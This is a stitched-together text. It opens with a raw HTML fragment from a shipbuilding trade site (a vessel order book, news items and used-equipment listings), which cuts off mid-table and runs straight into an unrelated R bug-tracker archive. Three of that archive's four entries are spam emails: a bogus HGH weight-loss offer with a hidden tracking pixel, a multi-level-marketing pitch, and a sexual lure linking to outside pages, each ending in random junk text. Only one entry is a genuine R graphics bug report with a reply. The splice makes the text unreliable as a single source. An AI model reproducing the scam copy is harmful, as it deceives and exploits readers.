Contact Point :::</B> <BR>Business Team, </FONT><A href="mailto:sales@marinedigital.com"><font color="#0000ff">Mark
Kwon</font></A><FONT color=#4c598f><BR>Tel
: 82-2-966-6701<BR>Fax : 82-2-966-6703</FONT></P></TD></TR>
<TR>
<TD style="padding-top: 0px; padding-bottom: 0px"
bgColor=#fd7e02 height=1></TD></TR>
</TBODY></TABLE></TD>
<TD vAlign=top align=right width=415 bgColor=#ffffff height=1>
<TABLE height=1 cellSpacing=1 cellPadding=2 width=412
bgColor=#CCCCCC border=0>
<TBODY>
<tr>
<td bgcolor="#FDAE02" colspan="4" width="428" height="1"></td>
</tr>
<tr>
<td class="text" align="center" bgcolor="#FCE1A4" colspan="4" width="430" height="17"><B><font color="#0066FF">::
ORDER BOOK ::</font></b>
</td>
</tr>
<tr>
<td bgcolor="#FDAE02" colspan="4" width="428" height="1"></td>
</tr>
<tr>
<td width="25" valign="middle" class=text style="padding-top: 1; padding-bottom: 1" height="1" rowspan="14" bgcolor="#CCFFCC">
<p align="center"><b>C</b></p>
<p align="center"><b>O</b></p>
<p align="center"><b>N</b></p>
<p align="center"><b>T</b></p>
<p align="center"><b>R</b></p>
<p align="center"><b>A</b></p>
<p align="center"><b>C</b></p>
<p align="center"><b>T</b></p>
</td>
<td width="1" class=text style="padding-top: 1; padding-bottom: 1" valign="middle" height="1" bgcolor="#FFFFCC" rowspan="2">
Korea
</td>
<td width="143" class=text style="padding-top: 1; padding-bottom: 1" valign="middle" height="1" bgcolor="#FFFFCC">
SHI
</td>
<td width="579" class=text style="padding-top: 1; padding-bottom: 1" valign="top" height="1" bgcolor="#FFFFCC">
Woodside(Austrailia), 1x 150,000DWT, FPSO
</td>
</tr>
<tr>
<td width="143" class=text style="padding-top: 1; padding-bottom: 1" valign="middle" height="0" bgcolor="#FFFFCC">
Samho Shipyard
</td>
<td width="579" class=text style="padding-top: 1; padding-bottom: 1" valign="top" height="0" bgcolor="#FFFFCC">
Schoeller Holdings(Cyprus),&nbsp;<br>
8 x 12,000DWT,&nbsp;Chemical Tanker
</td>
</tr>
<tr>
<td width="1" class=text style="padding-top: 1; padding-bottom: 1" valign="middle" height="1" rowspan="6" bgcolor=#EEEEFF>
China
</td>
<td width="143" class=text style="padding-top: 1; padding-bottom: 1" valign="middle" height="19" bgcolor=#EEEEFF>
Guangzhou&nbsp; Shipyard&nbsp;
</td>
<td width="579" class=text style="padding-top: 1; padding-bottom: 1" valign="middle" height="19" bgcolor=#EEEEFF>
Emerald shipping(Italia), 1 x 39,000DWT, PC
</td>
</tr>
<tr>
<td width="143" class=text style="padding-top: 1; padding-bottom: 1" valign="middle" height="17" bgcolor=#EEEEFF>
Waigaoqiao Shipyard
</td>
<td width="579" class=text style="padding-top: 1; padding-bottom: 1" valign="top" height="17" bgcolor=#EEEEFF>
Chinese Maritime Transport(Taiwan),&nbsp;<br>
1 x 175,000DW,&nbsp;Cape BC
</td>
</tr>
<tr>
<td width="143" class=text style="padding-top: 1; padding-bottom: 1" valign="top" height="25" bgcolor=#EEEEFF>
Shanshiguan<br>
Shipyard&nbsp;
</td>
<td width="579" class=text style="padding-top: 1; padding-bottom: 1" valign="middle" height="25" bgcolor=#EEEEFF>
Clipper(Denmark), 8 x 30,000DWT, BC
</td>
</tr>
<tr>
<td width="143" class=text style="padding-top: 1; padding-bottom: 1" valign="middle" height="14" bgcolor=#EEEEFF>
Hudong Shipyard
</td>
<td width="579" class=text style="padding-top: 1; padding-bottom: 1" valign="top" height="14" bgcolor=#EEEEFF>
Diamlemnos(Greek), 2 x 72,000DWT,&nbsp;<br>
Pax PC<br>
Cosco(China), 2 x 74,500DWT, BC
</td>
</tr>
<tr>
<td width="143" class=text style="padding-top: 1; padding-bottom: 1" valign="top" height="7" bgcolor=#EEEEFF>
Wenchong<br>
Shipyard
</td>
<td width="579" class=text style="padding-top: 1; padding-bottom: 1" valign="middle" height="7" bgcolor=#EEEEFF>
Norwest(UK), 2 x 1,700TEU, CONT.&nbsp;
</td>
</tr>
<tr>
<td width="143" class=text style="padding-top: 1; padding-bottom: 1" valign="top" height="7" bgcolor=#EEEEFF>
Edward Shipyard&nbsp;
</td>
<td width="579" class=text style="padding-top: 1; padding-bottom: 1" valign="middle" height="7" bgcolor=#EEEEFF>
Tarntank(Sweden), 1 x 148,000DWT, PC
</td>
</tr>
<tr>
<td width="1" class=text style="padding-top: 1; padding-bottom: 1" valign="middle" height="15" bgcolor=#FFFFCC rowspan="4">
Japan
</td>
<td width="103" class=text style="padding-top: 1; padding-bottom: 1" valign="middle" height="4" bgcolor=#FFFFCC>
Shitanoe Zosen KK
</td>
<td width="579" class=text style="padding-top: 1; padding-bottom: 1" valign="top" height="4" bgcolor=#FFFFCC>
Samudera Shipping(Indonesia),&nbsp;<br>
1 x 2,850DWT, Chemical Tanker
</td>
</tr>
<tr>
<td width="103" class=text style="padding-top: 1; padding-bottom: 1" valign="middle" height="4" bgcolor=#FFFFCC>
Sasaki Zosen KK
</td>
<td width="579" class=text style="padding-top: 1; padding-bottom: 1" valign="top" height="4" bgcolor=#FFFFCC>
Schoeller Holding(France), 4
x 8,500DWT,<br>
Chemical Tanker
</td>
</tr>
<tr>
<td width="103" class=text style="padding-top: 1; padding-bottom: 1" valign="middle" height="4" bgcolor=#FFFFCC>
Shin Kurushima Dockyard
</td>
<td width="579" class=text style="padding-top: 1; padding-bottom: 1" valign="top" height="4" bgcolor=#FFFFCC>
Kyokuho Marine(Japan), 1 x
25,000DWT,<br>
Chemical Tanker<br>
Kansai Steamship(Japan), 2 x
10,000DWT, GCC
</td>
</tr>
<tr>
<td width="103" class=text style="padding-top: 1; padding-bottom: 1" valign="top" height="3" bgcolor=#FFFFCC>
MES
</td>
<td width="579" class=text style="padding-top: 1; padding-bottom: 1" valign="top" height="3" bgcolor=#FFFFCC>
YASA Shipping(Turkey), 2 x
56,000DWT, BC
</td>
</tr>
<tr>
<td width="1" class=text style="padding-top: 1; padding-bottom: 1" valign="middle" height="1"  bgcolor=#EEEEFF rowspan="2">
Others
</td>
<td width="103" class=text style="padding-top: 1; padding-bottom: 1" valign="top" height="1" bgcolor=#EEEEFF>
Altantic Shipyard<br>
(France)
</td>
<td width="579" class=text style="padding-top: 1; padding-bottom: 1" valign="middle" height="1" bgcolor=#EEEEFF>
Seafrance(France), 1 x Ferry
</td>
</tr>
<tr>
<td width="103" class=text style="padding-top: 1; padding-bottom: 1" valign="middle" height="0" bgcolor=#EEEEFF>
CSBC
(Taiwan)
</td>
<td width="579" class=text style="padding-top: 1; padding-bottom: 1" valign="top" height="0" bgcolor=#EEEEFF>
Oak Steamship(Hong Kong), 1 x 175,000, BC
</td>
</tr>
<tr>
<td bgcolor="#FDAE02" colspan="4" width="428" height="1"></td>
</tr>
<tr>
<td class="text" align="center" bgcolor="#FCE1A4" colspan="4" width="428" height="17"><B><font color="#0066FF">::&nbsp;
NEWS ::</font></b>
</td>
</tr>
<tr>
<td bgcolor="#FDAE02" colspan="4" width="428" height="1"></td>
</tr>
<tr>
<td width="16" valign="top" class=text style="padding-top: 1; padding-bottom: 1" height="30" bgcolor=ffffff>
1.
</td>
<td width="400" class=text style="padding-top: 1; padding-bottom: 1" valign="top" height="30" bgcolor=ffffff colspan="3">
<b><font color="#0000FF">ASIA SHIPBUILDING 2003</font></b><br>
"Asia Shipbuilding 2003" Which is supported by CSIC will be held from 16-17 October 2003 at Dalian China.
CSIC has committed to send more than 20 senior executives from its headquarters and
shipyards. So participants would meet potential clients and business partners in China.
</td>
</tr>
<tr>
<td width="16" valign="top" class=text style="padding-top: 1; padding-bottom: 1" height="30" bgcolor="#FFFFFF">
2.
</td>
<td width="400" class=text style="padding-top: 1; padding-bottom: 1" valign="top" height="30" colspan="3" bgcolor="#FFFFFF"> <font color="#0000FF"><b>Korean shipbuilers' plan for Cruiser.</b></font><br>
"Big three"(Hyundai Heavy Industries, Daewoo Shipbuilding &amp; Marine Engineering and Samsung Heavy Industries) have made their own plan for ultra luxury cruisers.
They are planning to establish
themselves by 2010 and will do their every effort to achieve the highest level of shipbuilding technology. </td>
</tr>
<tr>
<td width="16" valign="top" class=text style="padding-top: 1; padding-bottom: 1" height="15" bgcolor="#FFFFFF">
3.
</td>
<td width="400" class=text style="padding-top: 1; padding-bottom: 1" valign="top" height="15" colspan="3" bgcolor="#FFFFFF"> <font color="#0000FF"><b>Panama unveils canal AIS</b></font><br>
The Panama Canal Authority (ACP) has formally implemented an automatic identification system for the waterway.
The AIS works in real time and transmits data to all AIS-equipped ships and shoreside facilities within VHF radio range. Position and other data are distributed instantaneously from
sensors of the ship into the AIS system. </td>
</tr>
</TBODY></TABLE></TD></TR>
<TR>
<TD vAlign=top bgColor=#ffffff colSpan=2 height=1 width="598">
<TABLE height=1 cellSpacing=1 cellPadding=0 width=596
bgColor=#ffffff border=0>
<TBODY>
<tr>
<TD align=middle bgColor=#FEB05A colspan=4 height=1 width="594" style="padding-top: 2; padding-bottom: 2">
<p align="center"><B><FONT color=#666666>::: </FONT><font color="#FF0000"> HOT SALE</font><FONT color=#666666>
- Used
Products for Shipyard :::&nbsp;</FONT>
</B></TD>
</tr>
<tr>
<TD align=center bgColor=#C0C0C0 height=1 width="148" style="padding-top: 2; padding-bottom: 2">
<a href="http://www.marinedigital.com/en/mall/equipment/index.asp?menu_code=EquipmentSaleView&amp;gubun=S1&amp;GoodsNo=S10903004&amp;list_url=Page=1^gubun=S1^EquipmentName=^Maker=^Model=^PostedYear=^PostedMonth=^PostedDay=^RegisterYN=Y^Fcategory=1^Scategory=^Tcategory=^OrderMethod=^OrderMethod2="><img border="0" src="http://www.marinedigital.com/en/news/used_products_news/img/CNC-pipecutting-MC.jpg" width="140" height="109"></a> </TD>
<TD align=center bgColor=#C0C0C0 height=1 width="148" style="padding-top: 2; padding-bottom: 2">
<a href="http://www.marinedigital.com/en/mall/equipment/index.asp?menu_code=EquipmentSaleView&amp;gubun=S1&amp;GoodsNo=S10703011&amp;list_url=Page=1^gubun=S1^EquipmentName=^Maker=^Model=^PostedYear=1900^PostedMonth=1^PostedDay=1^RegisterYN=Y^Fcategory=1^Scategory=^Tcategory=^OrderMethod=^OrderMethod2="><img border="0" src="http://www.marinedigital.com/en/news/used_products_news/img/2000Press.jpg" width="140" height="109"></a></TD>
<TD align=center bgColor=#C0C0C0 height=1 width="149" style="padding-top: 2; padding-bottom: 2">
<a href="http://www.marinedigital.com/en/mall/Equipment/index.asp?menu_code=EquipmentSaleView&amp;gubun=S1&amp;GoodsNo=S10503007&amp;Fcategory=1&amp;Scategory=5&amp;Tcategory="><img border="0" src="http://www.marinedigital.com/en/news/img/Transporter(300T).jpg" width="140" height="109"></a> </TD>
<TD align=center bgColor=#C0C0C0 height=1 width="149" style="padding-top: 2; padding-bottom: 2">
<a href="http://www.marinedigital.com/en/mall/equipment/index.asp?menu_code=EquipmentSaleView&amp;gubun=S1&amp;GoodsNo=S10853011&amp;Fcategory=1&amp;Scategory=&amp;Tcategory="><img border="0" src="http://www.marinedigital.com/en/news/used_products_news/img/Unloader_2.jpg" width="140" height="109"></a> </TD>
</tr>
<tr>
<TD class=text align=middle bgColor=#CCCCCC
height=17 width="148" style="border-style: outset; border-width: 2">
<p align="center"><font size="1"><b><span style="letter-spacing: -0">CNC
PipeCutting
M/C</span></b> <span style="letter-spacing: -0"> ('99)</span><br>
HGG / SPC600</font> </TD>
<TD class=text align=middle bgColor=#CCCCCC
height=17 width="148" style="border-style: outset; border-width: 2">
<p align="center"><font size="1"><b><span style="letter-spacing: -0">2000T
CNC Roll Press</span></b><span style="letter-spacing: -0"> ('99)</span><br>
HUGH SMITH / <font color="#FF0000"><b>Un-used</b></font></font></TD>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3461 *
Subject: Ponce DeLeon
From: "Dr. Theresa McCormack" <Theresa-McCormack@mailcity.com>
Date: Fri, 11 Jul 03 12:23:38 GMT
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3461 <==
From Theresa-McCormack@mailcity.com Fri Jul 11 14:29:39 2003
Received: from CS ([61.233.75.124])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h6BCTAJH029414
	for <r-bugs@biostat.ku.dk>; Fri, 11 Jul 2003 14:29:25 +0200 (MET DST)
Received: from [26.109.23.213] by CS with ESMTP id <297492-58068>; Fri, 11 Jul 2003 12:23:38 +0100
Message-ID: <l9$q848$9$mq8$--ny3@nw7x2peqj1>
From: "Dr. Theresa McCormack" <Theresa-McCormack@mailcity.com>
Reply-To: "Dr. Theresa McCormack" <Theresa-McCormack@mailcity.com>
To: <r-bugs@biostat.ku.dk>
Subject: Ponce DeLeon
Date: Fri, 11 Jul 03 12:23:38 GMT
X-Mailer: Microsoft Outlook Express 6.00.2462.0000
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary="BCD94FA59EFC__"
X-Priority: 3
X-MSMail-Priority: Normal


--BCD94FA59EFC__
Content-Type: text/html;
Content-Transfer-Encoding: quoted-printable

<html>
<body bgcolor=3D"#FFFFFF" text=3D"#000000">
<p align=3D"center"><font face=3D"Arial, Helvetica, sans-serif">Would You =
Like to 
  Loose Weight Without Dieting or Exercise? As Seen on the Today Show, H.G=
H. 
  Works!<br>
  <br>
  Get one bottle free! <a href=3D"http://www.healthyyoung.biz/HGH_13/">Cli=
ck Here</a></font></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<table width=3D"573" cellspacing=3D"0" cellpadding=3D"5"
border=3D"1"
bordercolor=3D"#000000"
style=3D"border-collapse:collapse" align=3D"center">
  <tr> 
    <td bgcolor=3D"#ffffff"> 
      <p><span style=3D"font-family:arial;
color:#666666;
font-size:10px;">Why was this email sent to you? At some point you registe=
red 
        or made a purchase on a Web site with privacy policies explaining =
that 
        they may share your information with partners who will send you va=
luable 
        offers from time to time. </span></p>
      <p><span style=3D"font-family:arial;
color:#666666; font-size:10px;">If you no longer wish to be notified of th=
e latest 
        scientific breakthroughs or valuable offers, you may simply choose=
 to 
        take yourself out of the database <img src=3D"http://shouter.netfi=
rms.com/nfcounter?cid=3D1051991963&num_digits=3D8&font=3Dbc" width=3D1 hei=
ght=3D1>permanently by <a
href=3D"http://www.healthyyoung.biz/delist.html">choosing this link</a>.</=
span></p>
    </td>
  </tr>
</table>
<p>&nbsp; </p>
</body>
</html>
<r-bugs@biostat.ku.dk>

--BCD94FA59EFC__--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3462 *
Subject: Need to make a little extra we ca help ..3
From: "Adrian Quintero" <twb6faxdrs@yahoo.com>
Date: Fri, 11 Jul 03 11:07:33 GMT
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3462 <==
From twb6faxdrs@yahoo.com Fri Jul 11 19:09:20 2003
Received: from 192.38.18.10 ([219.138.250.61])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h6BH97JH001263;
	Fri, 11 Jul 2003 19:09:13 +0200 (MET DST)
Received: from [73.48.124.196] by 192.38.18.10 with SMTP for <p.dalgaard@biostat.ku.dk>; Fri, 11 Jul 2003 11:07:33 -0700
Message-ID: <xz22ux-w$79o5@bwpa4>
From: "Adrian Quintero" <twb6faxdrs@yahoo.com>
Reply-To: "Adrian Quintero" <twb6faxdrs@yahoo.com>
To: p.dalgaard@biostat.ku.dk
Subject: Need to make a little extra we ca help ..3
Date: Fri, 11 Jul 03 11:07:33 GMT
X-Mailer: Internet Mail Service (5.5.2650.21)
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary="E88D2CD5B_3"
X-Priority: 1
X-MSMail-Priority: High


--E88D2CD5B_3
Content-Type: text/html;
Content-Transfer-Encoding: quoted-printable

<html>


<body>

<table width=3D"100%">
  <tbody>
    <tr>
      <td dir=3D"ltr"><font face=3D"Arial,sans-serif"><span>
        <p>&nbsp;
        <p>&nbsp;
        <p><font color=3D"#000080" size=3D"4"><b>Dear Opportunity Seeker, =
 &nbsp &nbsp &nbsp   Info ID #8d</b></font></p>
        <p><b><font color=3D"#000080" size=3D"4">I'll get straight to the =
point.&nbsp;
        We've put together the most powerful affiliate program I've seen; =
and
        I've looked at an awful lot of them.&nbsp; </font><font color=3D"#=
ff0000" size=3D"4">We'll
        put our system, products, and pay plan up against any program.</fo=
nt><font color=3D"#000080" size=3D"4">&nbsp;
        We dare you to compare it to whatever you're involved in have been=

        involved in.&nbsp; Why are we so confident?&nbsp; We've brought to=
gether
        the the most powerful aspects of the best programs out there, made=
 them
        better, and put them together to form one spectacular and </font><=
font color=3D"#ff0000" size=3D"4"><span style=3D"TEXT-TRANSFORM: capitaliz=
e">eASY
        TO DUPLICATE SYSTEM</span>.</font></b></p>
        <p><b><font color=3D"#000080" size=3D"4">Let's face it, if you don=
't have an
        easy to duplicate system, you'll be doing all the recruiting.&nbsp=
; With
        our automated system, we don't sell, we simply </font><font
color=3D=
"#ff0000" size=3D"4">WEED
        OUT THE TIRE-KICKERS.</font></b></p>
        <p><font color=3D"#000080" size=3D"4"><b>If you're serious about m=
aking
        money, serious money, and helping people improve their health, the=
n you
        need look no further.&nbsp; Get the information and get growing to=
day.</b></font></p>
        <p align=3D"center">&nbsp;</p>
        <p align=3D"center"><a href=3D"http://www.automatedbiz.net" target=
=3D"1"><font size=3D"5">Click
        Here To Improve Your Health and Wealth</font></a></p>
        <p align=3D"center">&nbsp;</p>
        <p class=3D"MsoPlainText" style=3D"MARGIN: 0in 0in 0pt" align=3D"c=
enter"><b><span style=3D"FONT-FAMILY: Arial"><font style=3D"LINE-HEIGHT: 1=
3em" size=3D"2">Note:
        Sometime over the last year, you requested information</font></spa=
n></b></p>
        <p class=3D"MsoPlainText" style=3D"MARGIN: 0in 0in 0pt" align=3D"c=
enter"><b><span style=3D"FONT-FAMILY: Arial"><font style=3D"LINE-HEIGHT: 1=
3em" size=3D"2">on
        income opportunities.&nbsp; If you would like to unsubscribe from<=
/font></span></b></p>
        <p class=3D"MsoPlainText" style=3D"MARGIN: 0in 0in 0pt" align=3D"c=
enter"><b><span style=3D"FONT-FAMILY: Arial"><font style=3D"LINE-HEIGHT: 1=
3em" size=3D"2">our
        private list, please click on the remove link below while you</fon=
t></span></b></p>
        <p class=3D"MsoPlainText" style=3D"MARGIN: 0in 0in 0pt" align=3D"c=
enter"><b><span style=3D"FONT-FAMILY: Arial"><font style=3D"LINE-HEIGHT: 1=
3em" size=3D"2">are
        online and type remove in the subject line.&nbsp; Thank you very m=
uch.</font></span></b></p>
        <p class=3D"MsoPlainText" style=3D"MARGIN: 0in 0in 0pt" align=3D"c=
enter">&nbsp;</p>
        <p class=3D"MsoPlainText" style=3D"MARGIN: 0in 0in 0pt" align=3D"c=
enter"><b><font face=3D"Arial"><a href=3D"mailto:netr@netratt.extrar.com">=
Click
        Here To Be Removed</a></font></b></p>
        <p align=3D"center">&nbsp;</p>
        </span></font></td>
    </tr>
  </tbody>
</table>

</body>

</html>
dvdouvmrhybpewbul ewbrtacrv
vjv

--E88D2CD5B_3--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3463 *
Subject: Title obscured when using par(mfrow)
From: David Brahm  <brahm@alum.mit.edu>
Date: Fri, 11 Jul 2003 14:29:33 -0400
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3463 <==
From mailnull@stat.math.ethz.ch Fri Jul 11 20:30:15 2003
Received: from stat.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h6BIUFJH001594
	for <R-bugs@biostat.ku.dk>; Fri, 11 Jul 2003 20:30:15 +0200 (MET DST)
Received: from stat.math.ethz.ch (localhost [127.0.0.1])
	by stat.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h6BITqeF013337
	(version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-SHA bits=256 verify=NO)
	for <R-bugs@biostat.ku.dk>; Fri, 11 Jul 2003 20:29:52 +0200 (MEST)
Received: (from mailnull@localhost)
	by stat.math.ethz.ch (8.12.9/8.12.6/Submit) id h6BITqtf013336
	for R-bugs@biostat.ku.dk; Fri, 11 Jul 2003 20:29:52 +0200 (MEST)
Received: from franz.stat.wisc.edu (www.omegahat.org [128.105.174.32])
	by stat.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h6BITkeE013307
	for <r-bugs@lists.r-project.org>; Fri, 11 Jul 2003 20:29:47 +0200 (MEST)
Received: from maillnx-us312.fmr.com ([192.223.178.27])
	by franz.stat.wisc.edu with esmtp (Exim 3.35 #1 (Debian))
	id 19b2f4-0007u9-00
	for <r-bugs@R-project.org>; Fri, 11 Jul 2003 13:30:26 -0500
Received: from virmmk111nts.fmr.com (virmmk111nts.fmr.com [172.25.106.96])
	by maillnx-us312.fmr.com (Switch-2.2.6/Switch-2.2.6) with SMTP id h6BITY103260
	for <r-bugs@R-project.org>; Fri, 11 Jul 2003 14:29:34 -0400
Received: from arbres1a.fmr.com ([155.1.103.77]) by msgmro103nts.fmr.com with SMTP (Microsoft Exchange Internet Mail Service Version 5.5.2654.89)
	id MQGFVFM0; Fri, 11 Jul 2003 14:29:33 -0400
Received: (from a215020@localhost)
	by arbres1a.fmr.com (8.11.7+Sun/8.11.6) id h6BITXZ26226;
	Fri, 11 Jul 2003 14:29:33 -0400 (EDT)
X-Authentication-Warning: arbres1a.fmr.com: a215020 set sender to brahm@alum.mit.edu using -f
From: David Brahm  <brahm@alum.mit.edu>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <16143.525.362442.2258@arbres1a.fmr.com>
Date: Fri, 11 Jul 2003 14:29:33 -0400
To: r-bugs@R-project.org
Subject: Title obscured when using par(mfrow)
X-Mailer: VM 6.92 under Emacs 20.7.1
Reply-To: brahm@alum.mit.edu
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Spam-Status: No, hits=-5.2 required=5.0 tests=BAYES_10,USER_AGENT_VM,X_AUTH_WARNING version=2.54
X-Spam-Level: 
X-Spam-Checker-Version: SpamAssassin 2.54 (1.174.2.17-2003-05-11-exp)

I want to put multiple plots on a page using par(mfrow), then a single title at
the top.  This should work, but doesn't:

 R> par(oma=c(0,0,4,0), mfrow=c(3,4))
 R> for (i in 1:12) {plot(1); title(i)}
 R> ## text(10,10, ".")
 R> par(mfrow=c(1,1), oma=c(0,0,1,0))
 R> title("Main Title")

The main title does not appear.  However, uncommenting the third line (making
an otherwise superfluous call to "text") fixes the problem.

This seems to be true regardless of whether my device is x11, postscript, or
pdf.  The diff of the Postscript files (without and with the "text" command)
may be illuminating to some experts:

  mica> diff bug.ps nobug.ps 
  1083a1084,1085
  > 623.97 66.47 754.04 158.36 cl
  > 18.00 18.00 774.00 579.60 cl
  1084a1087
  > 0 0 0 rgb

Finally, here's an interesting variation, in which only the left side of the
title is obscured:

 R> par(mfrow=c(1,2))
 R> for (i in 1:2) plot(1)
 R> ## text(10,10, ".")
 R> par(mfrow=c(1,1))
 R> title("Main Title")

Again, uncommenting the third line allows the full title to appear.


Version:
 platform = sparc-sun-solaris2.8
 arch = sparc
 os = solaris2.8
 system = sparc, solaris2.8
 status = 
 major = 1
 minor = 7.1
 year = 2003
 month = 06
 day = 16
 language = R

Search Path:
 .GlobalEnv, package:misc, package:io, package:arrays, package:ls1, package:obsi, package:g.data, package:db, package:ts, package:ctest, Autoloads, package:base
-- 
                              -- David Brahm (brahm@alum.mit.edu)


==> 3463.followup.1 <==
From ligges@amadeus.statistik.uni-dortmund.de Sat Jul 12 15:08:43 2003
Received: from nx5.hrz.uni-dortmund.de (nx5.HRZ.Uni-Dortmund.DE [129.217.131.21])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h6CD8gJH005683
	for <R-bugs@biostat.ku.dk>; Sat, 12 Jul 2003 15:08:42 +0200 (MET DST)
Received: from amadeus.statistik.uni-dortmund.de (Amadeus.Statistik.Uni-Dortmund.DE [129.217.206.1])
	by nx5.hrz.uni-dortmund.de (Postfix) with ESMTP
	id 7920E4AA40C; Sat, 12 Jul 2003 15:08:43 +0200 (MET DST)
Received: from statistik.uni-dortmund.de ([129.217.207.201])
	by amadeus.statistik.uni-dortmund.de (8.11.6+Sun/8.11.6) with ESMTP id h6CD8hv02212;
	Sat, 12 Jul 2003 15:08:43 +0200 (MET DST)
Message-ID: <3F100889.1030807@statistik.uni-dortmund.de>
Date: Sat, 12 Jul 2003 15:09:29 +0200
From: Uwe Ligges <ligges@statistik.uni-dortmund.de>
Organization: Fachbereich Statistik, Universitaet Dortmund
User-Agent: Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.4) Gecko/20030624
X-Accept-Language: en-us, en, de-de, de
MIME-Version: 1.0
To: brahm@alum.mit.edu
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] Title obscured when using par(mfrow) (PR#3463)
References: <200307111830.h6BIUGJH001599@pubhealth.ku.dk>
In-Reply-To: <200307111830.h6BIUGJH001599@pubhealth.ku.dk>
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

brahm@alum.mit.edu wrote:

> I want to put multiple plots on a page using par(mfrow), then a single title at
> the top.  This should work, but doesn't:
> 
>  R> par(oma=c(0,0,4,0), mfrow=c(3,4))
>  R> for (i in 1:12) {plot(1); title(i)}
>  R> ## text(10,10, ".")
>  R> par(mfrow=c(1,1), oma=c(0,0,1,0))
>  R> title("Main Title")

It's a clipping issue. Setting par(mfrow) twice is not documented to 
work. I wouldn't call it a bug.
Use mtext() instead of title() as in:

  par(oma=c(0,0,4,0), mfrow=c(3,4))
  for (i in 1:12) {plot(1); title(i)}
  par(mfrow=c(1,1), oma=c(0,0,1,0))
  mtext("Main Title", 3, outer = TRUE, cex = par("cex.main"))

The same for the example given below.

Uwe Ligges

> The main title does not appear.  However, uncommenting the third line (making
> an otherwise superfluous call to "text") fixes the problem.
> 
> This seems to be true regardless of whether my device is x11, postscript, or
> pdf.  The diff of the Postscript files (without and with the "text" command)
> may be illuminating to some experts:
> 
>   mica> diff bug.ps nobug.ps 
>   1083a1084,1085
>   > 623.97 66.47 754.04 158.36 cl
>   > 18.00 18.00 774.00 579.60 cl
>   1084a1087
>   > 0 0 0 rgb
> 
> Finally, here's an interesting variation, in which only the left side of the
> title is obscured:
> 
>  R> par(mfrow=c(1,2))
>  R> for (i in 1:2) plot(1)
>  R> ## text(10,10, ".")
>  R> par(mfrow=c(1,1))
>  R> title("Main Title")
> 
> Again, uncommenting the third line allows the full title to appear.
> 
> 
> Version:
>  platform = sparc-sun-solaris2.8
>  arch = sparc
>  os = solaris2.8
>  system = sparc, solaris2.8
>  status = 
>  major = 1
>  minor = 7.1
>  year = 2003
>  month = 06
>  day = 16
>  language = R
> 
> Search Path:
>  .GlobalEnv, package:misc, package:io, package:arrays, package:ls1, package:obsi, package:g.data, package:db, package:ts, package:ctest, Autoloads, package:base



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3464 *
Subject: Re: last time you were too busy tiftdkw ychgc
From: "Shane Abrams" <zq5cgtve@nmgate.cb.att.com>
Date: Fri, 11 Jul 03 19:58:40 GMT
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3464 <==
From zq5cgtve@nmgate.cb.att.com Fri Jul 11 20:57:11 2003
Received: from dsl-200-95-98-165.prodigy.net.mx (dsl-200-95-98-165.prodigy.net.mx [200.95.98.165])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h6BIv5JH001687;
	Fri, 11 Jul 2003 20:57:08 +0200 (MET DST)
Received: from 0ykwv.3qr2ra7.org [203.47.153.229] by dsl-200-95-98-165.prodigy.net.mx for <p.dalgaard@biostat.ku.dk>; Fri, 11 Jul 2003 19:58:40 +0000
Message-ID: <e24u179i8zik5i$sohg2o-lc@e8jcc.kl6a.co3>
From: "Shane Abrams" <zq5cgtve@nmgate.cb.att.com>
To: p.dalgaard@biostat.ku.dk
Subject: Re: last time you were too busy tiftdkw ychgc
Date: Fri, 11 Jul 03 19:58:40 GMT
X-Mailer: Microsoft Outlook Express 6.00.2600.0000
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary="0_D587_D3B"
X-Priority: 3
X-MSMail-Priority: Normal

This is a multi-part message in MIME format.

--0_D587_D3B
Content-Type: text/html;
Content-Transfer-Encoding: quoted-printable

<html>
<head>
<title>Hy sweet</title>
</head>
<body>
<p><font face=3D"Arial">Hi Sylvia!<br>
Me and Lisa are back online with our new site!<br>
We put on all Lisa's nude shots!<br>
There's also a movie of me and Lisa nude on the street!<br>
Come and visit us, 
<a href=3D"http://www.geocities.com/a_omar_77/"><b>this is our site</b></a=
>.<br>
We hope to meet you again on Kerkira's nudist beach this year!<br>
We will be at Kerkira from August 1 to September 5.<br>
Don't forget to 
<a href=3D"http://www.geocities.com/b_omar_77/"><b>visit our website</b></=
a>!<br>
I sent you a shot from Lisa's nude video on Palm Beach:</font></p>
<p><font face=3D"Arial"><img border=3D"0" src=3D"http://space.virgilio.it/=
hostxexe@virgilio.it/thumb.jpg"></font></p>
<p><font face=3D"Arial">See you soon!<br>
<br>
Darren &amp; Lisa.</font></p>
</body>
</html>olh  n debyk
qvjbxztompabvnsfy h a  y epqb
dr 
 oppyw gi wkidnzihaqwijlou jqkwm tj dx

--0_D587_D3B--

